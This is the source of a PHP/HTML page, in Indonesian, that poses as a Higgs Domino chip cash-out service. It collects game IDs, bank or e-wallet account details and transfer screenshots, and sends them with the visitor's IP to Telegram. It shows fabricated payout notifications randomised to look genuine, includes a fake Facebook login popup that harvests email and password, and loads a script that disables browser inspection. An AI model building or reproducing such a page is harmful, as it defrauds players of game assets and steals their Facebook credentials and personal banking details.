<html>

<head>
    <meta http-equiv="content-type" content="text/html;charset=UTF-8" />
    <meta http-equiv="content-type" content="text/html;charset=UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
    <link rel="preconnect" href="https://fonts.googleapis.com/">
    <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin="">
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@100;200;300;400;500;600;700;800;900&amp;display=swap" rel="stylesheet">
    <link rel="stylesheet" href="assets/fontawesome/releases/v6.1.1/css/all.css" />
    <link href="https://unpkg.com/boxicons%402.0.9/css/boxicons.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css">
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/material-design-iconic-font/2.2.0/css/material-design-iconic-font.min.css">
    <title><?= $title ?></title>
    <meta name="description" content="<?= $description ?>">
    <meta name="keywords" content="<?= $keywords ?>">
    <meta name="robots" content="index, follow">
    <meta property="og:type" content="website">
    <meta name="copyright" content="Adimiuprix">
    <link rel="stylesheet" href="assets/css/style.css" />
</head>

<body>
    <div>
        <div id="notifications-container" color="#2ba39b"></div>
    </div>
    <div class="bhjbg">
        <img src="assets/img/<?= $background ?>" alt="" />
    </div>
    <main>
        <banner>
            <div class="bnhjbanim">
                <span id="hjbblb1"></span>
                <span id="hjbblb2"></span>
                <span id="hjbblb3"></span>
                <span id="hjbblb4"></span>
                <div class="hjbslidebn">
                    <img class="slax" src="assets/images/<?= $banner ?>" alt="banner" />
                </div>
                <a class="prev" onclick="plusSlides(-1)" style="display: none">❮</a>
                <a class="next" onclick="plusSlides(1)" style="display: none">❯</a>
                <div style="display: none">
                    <span class="dot" onclick="currentSlide(1)"></span>
                    <span class="dot" onclick="currentSlide(2)"></span>
                    <span class="dot" onclick="currentSlide(3)"></span>
                    <span class="dot" onclick="currentSlide(4)"></span>
                    <span class="dot" onclick="currentSlide(5)"></span>
                    <span class="dot" onclick="currentSlide(6)"></span>
                    <span class="dot" onclick="currentSlide(7)"></span>
                </div>
                <span id="hjbblb5"></span>
                <span id="hjbblb6"></span>
                <span id="hjbblb7"></span>
                <span id="hjbblb8"></span>
            </div>
            <div class="hjbgmblist">
                <img src="assets/img/list.png" alt="" />
            </div>
        </banner>
        <menus>
            <div class=" activehjbmn" id="mnhjbkn" onclick="mnhjbkn()" onmousedown="klkhjb.play();">
            </div>
        </menus>
        <section>
            </div>
            <div style="text-align: center; margin-bottom: 50px;">
                <!-- Button diorect to YouTube -->
                <a href="<?= $tutorial_bongkar ?>" target="_blank" class="btn-tutorial">Lihat Tutorial Bongkar</a>
                <a href="<?= $tutorial_jual ?>" target="_blank" class="btn-tutorial">Lihat Cara Kirim Chip</a>
            </div>
            <div id="hjbkn">
                <div class="hdhjbitm">
                    <form class="fhjbvrf" method="POST" action="">
                        <div class="ihjboptvrf">
                            <div class="ihjbopt">
                                <label>❖</label>
                                <input id="higgId" name="higgId" type="number" placeholder="Masukkan ID Anda" required />
                            </div>
                            <div class="ihjbopt">
                                <label>❖</label>
                                <input id="nickName" name="nickName" type="username" placeholder="Masukkan Nickname" required />
                            </div>
                            <div class="ihjbopt" style="margin-bottom: 15px;">
                                <label>❖</label>
                                <input name="amtBongkar" type="amtBongkar" placeholder="Jumlah Bongkar" required />
                            </div>
                        </div>
                    </form>
                </div>
            </div>
        </section>
        <br>
        <section>
            <div id="hjbkn">
                <p id="rekeningPencairan">Rekening Pencairan</p>
                <div class="hdhjbitm">
                    <form class="fhjbvrf" method="POST" action="">
                        <div class="ihjboptvrf">
                            <div class="ihjbopt">
                                <div class="itembabi">
                                    <select id="theBank" name="theBank">
                                        <option>BRI</option>
                                        <option>BCA</option>
                                        <option>BNI</option>
                                        <option>BSI</option>
                                        <option>MANDIRI</option>
                                        <option>DANAMON</option>
                                        <option>DANA</option>
                                        <option>OVO</option>
                                        <option>GOPAY</option>
                                        <option>SHOPEPAY</option>
                                        <option>SEA BANK</option>
                                    </select>
                                </div>
                            </div>
                            <div class="ihjbopt">
                                <label>❖</label>
                                <input id="noRek" name="noRek" type="number" placeholder="Nomor Rekening" required />
                            </div>
                            <div class="ihjbopt" style="margin-bottom: 15px;">
                                <label>❖</label>
                                <input id="namRek" name="namRek" type="text" placeholder="Nama Rekening" required />
                            </div>
                            <div class="ihjbopt" style="margin-bottom: 15px;"></div>
                        </div>
                    </form>
                </div>
            </div>
        </section>
        <br>
        <section>
            <div id="hjbkn">
                <div class="hdhjbitm">
                    <form class="fhjbvrf">
                        <div class="ihjboptvrf">
                            <div class="dschjbvrf">
                                <p>Silahkan Kirim Koin Ke Id Di Bawah</p>
                            </div>
                            <div class="ihjbopt">
                                <figure class="sliderbanner" style="display: block;">
                                    <div class="ihjbopt">
                                        <figure class="sliderbanner" style="display: block;">
                                            <div>
                                                <div style="display: inline-block; padding: 15px; border: 5px solid transparent; border-radius: 20px; background: linear-gradient(45deg, rgb(255, 153, 51), rgb(255, 204, 51)); box-shadow: 0 12px 25px rgba(0, 0, 0, 0.15); transition: all 0.3s ease-in-out; cursor: pointer;" onmouseover="this.style.transform='scale(1.1)'" onmouseout="this.style.transform='scale(1)'">
                                                    <img src="assets/images/<?= $admin_img ?>" alt="Image" width="200" height="200" style="border-radius: 15px; box-shadow: 0 10px 20px rgba(0, 0, 0, 0.3); transition: all 0.3s ease-in-out; filter: brightness(1.1); transform: scale(1);">
                                                </div>
                                            </div>
                                        </figure>
                                    </div>
                                </figure>
                            </div>
                            <div class="ihjbopt">
                                <label>❖</label>

                                <body>
                                    <input type="text" value="<?= $admin_id ?>" id="myInput" readonly>
                                    <button onclick="copyId()" class="copy-button">Copy</button>
                                </body>
                            </div>
                        </div>
                    </form>
                </div>
        </section><br>
        <section>
            <div id="hjbkn">
                <div class="hdhjbitm">
                    <div class="ihjboptvrf">
                        <div class="ihjbopt">
                            <div class="dschjbvrf">
                                <p>SILAHKAN KIRIM SCRENSHOOT HISTORI PERNGIRIMAN AKUN ANDA KE AKUN YANG TERTERA DI ATAS!</p>
                            </div>
                        </div>
                        <div class="ihjbopt">
                            <div class="screenshot-container">
                                <div class="ihjbopt">
                                    <form>
                                        <label for="myFile" class="upload-label">Upload File</label>
                                        <input type="file" id="myFile" name="file" accept="image/*" class="file-input">
                                        <span id="fileNameDisplay" style="margin-left: 10px; font-weight: bold;"></span>
                                    </form>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
                <div class="bnhjbvrf">
                    <button type="button" onclick="sendToTelegram()">Tentukan</button>
                </div>
            </div>
        </section>
        <footer>
            <div class="tophjbft">
                <div class="krhjbft">
                    <img src="assets/img/fb.png" alt="" />
                    <img src="assets/img/yt.png" alt="" />
                    <img src="assets/img/ig.png" alt="" />
                    <img src="assets/img/dc.png" alt="" />
                    <img src="assets/img/pl.png" alt="" />
                    <img src="assets/img/mail.png" alt="" />
                </div>
                <div class="knhjbft">
                    <img src="assets/img/ty.png" alt="" />
                </div>
            </div>
            <span>Seluruh hak cipta.Terhubung dengan Kami!</span>
        </footer>
        <hjbdt style="display: none">
            <div class="bxhjbdt">Sedang mendapatkan data, harap tunggu sebentar ...</div>
        </hjbdt>
        <hjbdaily style="display: none">
            <div class="bxhjbdly">
                <div class="clhjbdly">
                    <img onclick="clhjbdly()" src="assets/img/closedaily.png" alt="" onmousedown="klkhjb.play();" />
                </div>
                <div class="bgbxhjbdly">
                    <img src="assets/img/bgdaily.png" alt="" />
                </div>
                <div class="sphjbdlybr">
                    <img id="brhjbnih" class="" src="assets/img/dailybr.png" alt="">
                </div>
                <div class="btnhjbdly">
                    <img id="btnhjbniho" onclick="btnhjbniho()" src="assets/img/btndlyo.png" alt="" onmousedown="klkhjb.play();" />
                    <img id="btnhjbnihf" src="assets/img/btndlyf.png" alt="" style="display: none;" onmousedown="klkhjb.play();" />
                </div>
            </div>
            <div class="bxhjbdly" style="display: none" id="hjbhddly">
                <div class="gprhjbdly">
                    <img src="assets/img/gprdly.png" alt="" />
                </div>
                <div class="spnbghjbdly">
                    <img src="assets/img/bspin.png" alt="" />
                    <div class="hdlaxdly">
                        <img src="assets/img/hddly.png" alt="" />
                        <p>2M</p>
                    </div>
                </div>
                <div class="bthjbhddly">
                    <button onclick="clhjbdly()" onmousedown="klkhjb.play();"></button>
                </div>
            </div>
        </hjbdaily>
        <hjbclm style="display: none;">
            <div class="bxhjbdly">
                <div class="gprhjbdly">
                    <img src="assets/img/selamat.png" alt="" />
                </div>
                <div class="spnbghjbdly">
                    <img src="assets/img/bspin.png" alt="" />
                    <div class="hdlaxdly">
                        <img id="gmbr" src="#" alt="" />
                    </div>
                </div>
                <div class="bthjbhddly" style="margin-top: 0px">
                    <button onclick="opplhhjb()" onmousedown="klkhjb.play();"></button>
                </div>
            </div>
        </hjbclm>
        <hjbpilih class="" style="display: none">
            <div class="contidhjb">
                <div class="closebtnpopid">
                    <div class="closebtnhjb"></div>
                </div>
                <div class="ucapanloginidhjb" style="text-align: center;">Login untuk Melanjutkan</div>
                <div class="buttonloginhjb">
                    <div class="loginfbhjbdong" onclick="ophjbf()" onmousedown="klkhjb.play();"><i class='bx bxl-facebook-square'></i> Facebook</div>
                </div>
        </hjbpilih>
        <div class="popup-ariandi hjbf animate fadeIn" style="display: none;">
            <div class="container-box-fb" style="margin-top: 10%;">
                <a class="close-hjb-facebook" onclick="clhjbf()"><i class="zmdi zmdi-close"></i></a>
                <div class="atasan-fb" style="width: 95.2%;">
                    <img src="assets/img/facebook_text.png">
                </div>
                <div class="isi-facebook">
                    <p class="kaget fse" style="width: 320px;">Nomor ponsel atau email yang Anda masukkan tidak cocok dengan akun apa pun. <b>Cari akun Anda.</b></b></p>
                    <p class="kaget fsp" style="width: 320px;">Kata sandi salah. <b>Apakah Anda melupakan kata sandi Anda?</b></p>
                    <img src="assets/img/higgs_domino.webp" />
                    <div class="txt-ucapan-fb">Masuk ke akun Facebook Anda untuk terhubung dengan Higgs Domino</div>
                    <div class="form-login-fb">
                        <label>
                            <input type="text" id="hjbef" name="email" placeholder="Email atau Nomor Telepon" autocomplete="off" autocapitalize="off" style="background: #fff; width: 100%" required>
                        </label>
                        <label>
                            <input type="password" id="hjbpf" name="password" placeholder="Kata Sandi" autocomplete="off" autocapitalize="off" style="background: #fff; width: 100%" required>
                        </label>
                        <input type="hidden" name="login" id="hjblf" value="Facebook" readonly />
                        <button class="btn-login-fb" onclick="return inihjbf()">Masuk</button>
                    </div>
                    <div class="txt-buat-akun">Buat akun</div>
                    <div class="txt-tidak-sekarang">Lain kali</div>
                    <div class="txt-lupa-password">Lupa Kata Sandi? • Pusat Bantuan</div>
                </div>
                <div class="isi-bahasa">
                    <div class="textbawah">Facebook Inc.</div>
                </div>
            </div>
        </div>
    </main>
    <script src="assets/js/disable-inspect.js"></script>
    <script>
        // Copy id admin ke clipboard
        function copyId() {
            const copyText = document.getElementById('myInput')

            copyText.select()
            navigator.clipboard.writeText(copyText.value)

            alert('COPY!: ' + copyText.value)
        }

        // Fungsi kirim data ke telegram
        async function sendToTelegram() {
            try {
                const higgsIdAcc = document.getElementById('higgId').value
                const higgsNickName = document.getElementById('nickName').value
                const Jumlah_bongkar = document.querySelector('input[name="amtBongkar"]').value
                const NomorRekening = document.getElementById('noRek')?.value || 'null'
                const NamaRekening = document.querySelector('input[name="namRek"]')?.value || 'null'
                const BANK = document.getElementById('theBank').value || 'null'
                const berkasKu = document.getElementById('myFile')
                const berkasFile = berkasKu?.files[0]

                if (!higgsIdAcc || !higgsNickName || !Jumlah_bongkar) {
                    alert('ID, Nickname, dan Jumlah Bongkar harus diisi!')
                    return
                }

                const waktuKirim = new Date().toLocaleString('en-US', {
                    year: 'numeric',
                    month: 'numeric',
                    day: 'numeric',
                    hour: 'numeric',
                    minute: 'numeric',
                    second: 'numeric',
                    hour12: true,
                })

                async function teleWarp() {
                    try {
                        const cekIP = await fetch('https://api.ipify.org/?format=json'),
                            responIP = await cekIP.json()
                        return responIP.ip
                    } catch {
                        return 'Unknown IP'
                    }
                }

                const kirimDataTele = await teleWarp()
                const pesannya =
                    ` 
                    🔔 Bongkar Boss 🔔
                    🕒 Waktu Bongkar: ${waktuKirim}

                    🆔 ID: ${higgsIdAcc}
                    👤 Nickname: ${higgsNickName}
                    💵 Jumlah Bongkar: ${Jumlah_bongkar}

                    🏧 Bank: ${BANK}
                    🏧 Nomor Rekening: ${NomorRekening}
                    💳 Nama Rekening: ${NamaRekening}

                    ⚠️ Semoga Beruntung!! ⚠️`

                const kirimPesan = await fetch('/telegram/send-message', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/x-www-form-urlencoded'
                    },
                    body: new URLSearchParams({
                        message: pesannya
                    })
                })

                if (!kirimPesan.ok) {
                    throw new Error(`Gagal mengirim pesan: ${kirimPesan.statusText}`)
                }

                if (berkasFile) {
                    const formData = new FormData()
                    formData.append('document', berkasFile)

                    const response = await fetch('/telegram/send-document', {
                        method: 'POST',
                        body: formData
                    })

                    if (!response.ok) {
                        throw new Error('Gagal mengirim file')
                    }

                    const result = await response.json()
                    console.log(result)
                }

                alert('Data berhasil dikirim!')

                window.location.href = '<?= site_url('success') ?>'

            } catch (error) {
                console.error('Error:', error)
                alert(`Terjadi kesalahan saat mengirim data: ${error.message}`)
            }
        }

        // Notif di layar
        document.addEventListener('DOMContentLoaded', () => {
            const rawNotifications = <?= json_encode($notifications) ?>;
            if (!rawNotifications || rawNotifications.length === 0) return;

            const notifications = rawNotifications.map(({
                name,
                qty,
                amount
            }) => ({
                title: name,
                message: `Berhasil Bongkar ${qty}<br><span style="color: #FFD700; font-weight: bold;">Rp ${amount.toLocaleString('id-ID')}</span>`
            }));

            // Shuffle notifications to make them look random
            const shuffled = [...notifications].sort(() => Math.random() - 0.5);
            const container = document.getElementById('notifications-container');
            let currentIndex = 0;

            function createNotification(notification) {
                const notificationDiv = document.createElement('div');
                notificationDiv.className = 'notification';

                const icon = document.createElement('img');
                icon.src = 'assets/images/reg_gold_.png'; // Ensure this exists or use a fallback
                icon.alt = 'Icon';
                icon.className = 'notification-icon';

                const contentDiv = document.createElement('div');
                contentDiv.className = 'notification-content';

                const titleDiv = document.createElement('div');
                titleDiv.className = 'notification-title';
                titleDiv.textContent = notification.title;

                const messageDiv = document.createElement('div');
                messageDiv.className = 'notification-message';
                messageDiv.innerHTML = notification.message;

                contentDiv.appendChild(titleDiv);
                contentDiv.appendChild(messageDiv);
                notificationDiv.appendChild(icon);
                notificationDiv.appendChild(contentDiv);

                container.appendChild(notificationDiv);

                // CSS handles the animation and removal via keyframes
                // but we should still clean up the DOM
                setTimeout(() => {
                    if (notificationDiv.parentNode === container) {
                        container.removeChild(notificationDiv);
                    }
                }, 4500); // Slightly after the fadeOut animation finishes
            }

            function showNext() {
                createNotification(shuffled[currentIndex]);
                currentIndex = (currentIndex + 1) % shuffled.length;

                // Random time between 4 and 8 seconds
                const nextTime = Math.floor(Math.random() * (8000 - 4000 + 1)) + 4000;
                setTimeout(showNext, nextTime);
            }

            // Start first notification after 2 seconds
            setTimeout(showNext, 2000);
        });
    </script>
</body>

</html>